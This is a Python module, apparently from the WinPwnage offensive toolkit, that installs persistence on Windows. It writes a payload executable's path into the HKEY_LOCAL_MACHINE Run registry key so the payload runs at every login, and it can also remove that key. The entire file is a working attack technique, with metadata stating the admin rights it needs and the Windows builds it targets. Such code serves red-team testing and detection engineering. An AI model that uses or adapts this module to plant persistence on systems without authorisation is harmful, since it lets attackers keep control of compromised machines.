from winpwnage.core.prints import *
from winpwnage.core.utils import *

hklmrun_info = {
	"Description": "Gain persistence using HKEY_LOCAL_MACHINE Run registry key",
	"Id": "7",
	"Type": "Persistence",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "hklm_run",
	"Function Payload": True,
}


def hklm_run(payload, name="", add=True):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if "64" in information().architecture():
		kpath = "Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"
	else:
		kpath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

	if add:
		if payloads().exe(payload):
			if registry().modify_key(hkey="hklm", path=kpath, name=name, value=payload):
				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to install persistence")
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hklm", path=kpath, name=name):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False
